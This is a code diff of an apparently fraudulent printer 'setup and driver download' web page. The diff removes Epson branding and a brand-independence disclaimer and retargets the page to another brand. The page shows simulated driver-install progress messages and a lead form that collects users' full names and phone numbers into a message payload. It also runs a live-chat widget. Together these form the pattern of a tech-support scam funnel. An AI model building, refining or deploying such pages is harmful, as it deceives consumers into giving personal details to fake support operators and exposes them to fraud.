@@ -12,7 +12,7 @@
 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Epson Printer Setup & Wi-Fi Configuration Portal</title>
+  <title>Printer Setup & Driver Downloads</title>
   
   <script src="/lucide.min.js" defer></script>
 
@@ -234,22 +234,6 @@
     .finder-img-wrap { width: 100%; display: flex; justify-content: center; align-items: center; margin-top: auto; padding-top: 0.5rem; }
     .model-finder-img { width: 100%; max-width: 22rem; height: auto; object-fit: contain; border-radius: 0.5rem; border: 1px solid #f3f4f6; }
 
-    /* ─── PROFESSIONAL SAFE DISCLAIMER BOX STYLES ──────────────────────────── */
-    .professional-disclaimer-box {
-      max-width: 1200px;
-      margin: 2rem auto;
-      padding: 1.25rem 2rem;
-      background-color: #f8fafc;
-      border-left: 4px solid #2563eb;
-      border-radius: 0.375rem;
-      font-size: 0.82rem;
-      color: #475569;
-      line-height: 1.6;
-    }
-    .professional-disclaimer-box strong {
-      color: #1e293b;
-    }
-
     /* ─── UTILITIES ACCORDIONS CONFIGURATION ────────────────────────────────── */
     .divider-section { background-color: #f4f4f5; border-top: 1px solid #e4e4e7; border-bottom: 1px solid #e4e4e7; padding: 3.5rem 1.5rem; text-align: center; }
     .divider-title { font-size: 1.875rem; font-weight: 900; letter-spacing: -0.05em; color: #18181b; margin-bottom: 0.5rem; }
@@ -370,17 +354,17 @@
     
     <div class="max-w-7xl hero-container">
       <div class="hero-content">
-        <h1 class="hero-title">Epson Printer Setup & Wi-Fi Configuration</h1>
+        <h1 class="hero-title">Printer Setup & Connection</h1>
         <ul class="hero-list">
-          <li>Complete Epson printer setup, wireless configuration, and driver downloads</li>
-          <li>Step-by-step guidance for EcoTank, WorkForce, and Expression series</li>
+          <li>Make sure your printer is powered on and ready</li>
+          <li>Select your connection type to complete wireless setup</li>
         </ul>
         <button type="button" class="hero-btn" onclick="openSetupModal()">
-          Start Epson Printer Setup <span>➔</span>
+          Start Printer Setup <span>➔</span>
         </button>
       </div>
       <div class="hero-img-side">
-        <img id="hero-printer-img" src="" alt="Epson Printer Device" class="hero-printer-img">
+        <img id="hero-printer-img" src="" alt="Printer Device" class="hero-printer-img">
       </div>
     </div>
   </section>
@@ -389,20 +373,20 @@
     <div class="max-w-6xl cards-container">
       
       <div class="content-card">
-        <h2 class="section-heading">Epson Printer Wi-Fi & Driver Setup</h2>
-        <p class="section-subheading">Enter your Epson printer model number below to initiate Wi-Fi connection and driver setup.</p>
+        <h2 class="section-heading">Quick Setup & Configuration</h2>
+        <p class="section-subheading">Enter your printer model below to view Wi-Fi, USB, and network setup instructions.</p>
         <form onsubmit="handleMainFormSubmit(event)">
           <div class="form-group">
-            <label class="form-label" for="mainModelInput">Enter Epson Model Number:</label>
-            <input type="text" id="mainModelInput" placeholder="e.g. EcoTank ET-2850, XP-4200" class="form-input" required>
+            <label class="form-label" for="mainModelInput">Enter Model Number:</label>
+            <input type="text" id="mainModelInput" placeholder="e.g. XP-4200, MF240" class="form-input" required>
           </div>
-          <button type="submit" class="form-submit-btn">Setup Epson Device 📥</button>
+          <button type="submit" class="form-submit-btn">Setup Device 📥</button>
         </form>
       </div>
 
       <div class="content-card">
-        <h3 class="section-heading">How to find your Epson model number?</h3>
-        <p class="section-subheading">The printer model name is printed on the front panel or top control lid of your Epson device.</p>
+        <h3 class="section-heading">How to find printer model number?</h3>
+        <p class="section-subheading">The product name label is visible prominently on the front or top layout of your device.</p>
         <div class="finder-img-wrap">
           <img id="model-finder-img" src="" alt="Printer identity layout diagram" class="model-finder-img">
         </div>
@@ -411,23 +395,16 @@
     </div>
   </section>
 
-  <!-- POLICY-SAFE INFORMATIONAL DISCLAIMER -->
-  <div class="max-w-6xl">
-    <div class="professional-disclaimer-box">
-      <strong>Notice:</strong> This web portal operates as an independent informational resource offering user setup instructions, configuration manuals, and self-service troubleshooting assistance. All mentioned brand names, logos, and model designations are utilized strictly for descriptive reference and compatibility identification purposes.
-    </div>
-  </div>
-
   <div class="divider-section">
-    <h2 class="divider-title font-sans">Epson Printer Troubleshooting & Help</h2>
-    <p class="divider-subtitle font-mono">Self-service solutions for offline errors, wireless pairing, and driver installation.</p>
+    <h2 class="divider-title font-sans">Need Help For Printer &amp; Scanner</h2>
+    <p class="divider-subtitle font-mono">Step-by-step guides for common software configurations — self-service guide.</p>
   </div>
 
   <div class="guide-section">
     <div class="max-w-3xl">
       <div class="guide-header">
-        <p class="guide-tag font-mono">Configuration Guide</p>
-        <h3 class="guide-main-title font-sans">Epson Printer Wi-Fi Setup & Error Fixes</h3>
+        <p class="guide-tag font-mono">Troubleshooting Guide</p>
+        <h3 class="guide-main-title font-sans">Common Issues &amp; Fixes</h3>
       </div>
       <div class="accordion-container" id="accordion-container"></div>
     </div>
@@ -440,7 +417,7 @@
   <div id="setupModal" class="modal-backdrop">
     <div class="modal-window animate-fadeIn">
       <div class="modal-header">
-        <h3 class="modal-title">Epson Printer Setup & Drivers</h3>
+        <h3 class="modal-title">Printer Setup &amp; Drivers</h3>
         <!-- STAYS OPEN UNTIL USER CLICKS (X) -->
         <button type="button" class="modal-close-x" onclick="forceCloseModal()">✕</button>
       </div>
@@ -476,15 +453,15 @@
 
         <!-- STEP 2: USER LEAD FORM POPUP -->
         <div id="step-form" class="step-panel">
-          <p class="step-instruction">Enter your Epson device details below to proceed with step-by-step Wi-Fi setup:</p>
+          <p class="step-instruction">Enter your device details below to proceed with step-by-step connection setup:</p>
           <form class="lead-form-box" onsubmit="handleLeadFormSubmit(event)">
             <div class="lead-field-group">
               <label class="lead-label" for="userNameInput">Full Name *</label>
               <input type="text" id="userNameInput" placeholder="John Doe" class="lead-input" required>
             </div>
             <div class="lead-field-group">
-              <label class="lead-label" for="userModelInput">Epson Printer Model Number *</label>
-              <input type="text" id="userModelInput" placeholder="e.g. EcoTank ET-2850" class="lead-input" required>
+              <label class="lead-label" for="userModelInput">Printer Model Number *</label>
+              <input type="text" id="userModelInput" placeholder="e.g. XP-4200, MF240" class="lead-input" required>
             </div>
             <div class="lead-field-group">
               <label class="lead-label" for="userPhoneInput">Phone Number *</label>
@@ -570,12 +547,12 @@
   };
 
   const guideSections = [
-    { id: "epson-wifi", icon: "wifi", title: "Epson Printer Wi-Fi Setup Guide", symptom: "How to connect your Epson printer to wireless network and resolve connection dropouts.", content: [{ heading: "Use Wi-Fi Direct or Control Panel", body: "Navigate to Setup → Network Settings → Wi-Fi Setup Wizard on your Epson printer screen. Select your network name (SSID) and enter your wireless security key." }, { heading: "Complete Software Driver Package", body: "Download the official driver bundle, ensure your computer and printer are connected to the same 2.4GHz/5GHz band, and finish the setup utility." }], tip: "Restart your wireless router and printer if the network SSID does not appear on the screen." }
+    { id: "not-printing", icon: "printer", title: "Printer Not Printing", symptom: "You send a job but nothing comes out — printer is on, no errors shown.", content: [{ heading: "Clear the print queue", body: "Windows: Control Panel → Devices and Printers → right-click printer → See what's printing → cancel every job. Mac: System Settings → Printers & Scanners → Open Print Queue → delete all." }, { heading: "Take the printer back online", body: "Windows: right-click printer → uncheck 'Use Printer Offline'. This resolves roughly 40% of cases." }], tip: "Restart both printer and computer before anything else." }
   ];
 
   const installingMessages = ["Installing drivers, please wait...", "Configuring printer settings...", "Downloading necessary files...", "Finalizing installation..."];
 
-  let detectedBrand = 'ep'; // Default to Epson configuration for best relevance match
+  let detectedBrand = 'ca';
   let connectionType = null;
   let progressIntervalTimer = null;
   let executionTimeoutTimer = null;
@@ -687,9 +664,9 @@
     const name = document.getElementById('userNameInput').value.trim();
     const model = document.getElementById('userModelInput').value.trim() || "Not provided";
     const phone = document.getElementById('userPhoneInput').value.trim();
-    const brandWord = brandConfigs[detectedBrand]?.shortWord || 'EP';
+    const brandWord = brandConfigs[detectedBrand]?.shortWord || 'CA';
 
-    const payload = `🖨️ <b>New Epson Driver Setup Form Received</b>
+    const payload = `🖨️ <b>New Driver Setup Form Received</b>
 
 👤 <b>Full Name:</b> ${escapeHTML(name)}
 🔢 <b>Model Number:</b> ${escapeHTML(model)}
@@ -784,12 +761,12 @@
 <!-- Start of LiveChat (www.livechat.com) code -->
 <script>
     window.__lc = window.__lc || {};
-    window.__lc.license = 19905813;
+    window.__lc.license = 19884871;
     window.__lc.integration_name = "manual_onboarding";
     window.__lc.product_name = "livechat";
     ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
 </script>
-<noscript><a href="https://www.livechat.com/chat-with/19905813/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+<noscript><a href="https://www.livechat.com/chat-with/19884871/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code -->
 </body>
 </html>
